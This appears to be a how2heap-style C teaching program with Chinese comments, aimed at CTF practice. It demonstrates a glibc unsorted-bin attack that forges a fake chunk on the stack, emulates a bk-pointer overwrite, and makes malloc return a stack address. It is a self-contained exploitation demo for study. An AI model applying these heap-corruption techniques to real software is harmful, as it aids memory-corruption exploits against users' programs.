#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>


void jackpot(){ printf("Nice jump d00d\n"); exit(0); }

int main() {
	setbuf(stdout, NULL);
	intptr_t stack_buffer[4] = {0};
	
//unsorted bin chunk攻击环境配置:(此环境在真实做题过程中无需自己配置，应为程序本省具备此特征)
	intptr_t* pointer[9];
	//分配mp_.tcache_count+2个chunk，之后释放，在填满tcache后一个chunk进入unsorted bin中，制造unsorted bin中环境
	for(int i = 0; i < 9; ++i){
		pointer[i] = malloc(0x80);
	}
	//注意，size不可位于fastbin的范围内，否则在填满tcache后依然无法进入unsorted bin中
	intptr_t* victim = malloc(0x80);
	printf("Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
	intptr_t* p1 = malloc(0x410);

	//释放分配的9个chunk中的8个，由于第9个chunk与victim相邻，会诱发合并，之后unsorted chunk头部为止改变，难以处理，故不释放。
	for(int i = 0; i < 7; ++i){
		free(pointer[i]);
	}
	//此时，victim对应的tcache处于装满的状态，victim进入unsorted bin
	printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
	//pointer[7]指向的chunk为unsorted bin的第一个chunk，而victim为第二个chunk
	//由于victim的bk指针指向fake chunk，故fake chunk的bk指针应指向pointer[7]
	free(victim);
	free(pointer[7]);
//攻击环境配置完成，跳板chunk为victim

//开始构造fake chunk
	printf("Create a fake chunk on the stack");
	printf("Set size for next allocation and the bk pointer to any writable address");
	//size域，根据之后malloc分配过程和unsorted bin中chunk分布构造size
		//如之后malloc函数的参数为0x130，则size域写入0x140即可
	stack_buffer[1] = 0x80;
	stack_buffer[2] = (intptr_t)(victim-0x2);
	stack_buffer[3] = (intptr_t)(pointer[7]-0x2);//fake_chunk->bk pointing to pointer[7]
	//fake chunk的地址空间上的next chunk的size需要在范围内,且size和prev_size需要相符
	intptr_t* next_prev_size = (intptr_t*)((char*)&stack_buffer + 0x80);
	intptr_t* next_size = (intptr_t*)((char*)&stack_buffer + 0x88);
	*next_prev_size = (intptr_t)0x80;
	*next_size = (intptr_t)0x41;

//构造fake chunk的bk chunk的fd域
	intptr_t* bk_chunk_fd = pointer[7]+0x2;
	*bk_chunk_fd = (unsigned long long)(&stack_buffer);
	//------------VULNERABILITY-----------
	printf("Now emulating a vulnerability that can overwrite victim->bk pointer\n");
	victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
	//------------------------------------

	printf("Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
	char *p2 = malloc(0x70);
	printf("malloc(0x70): %p\n", p2);
}
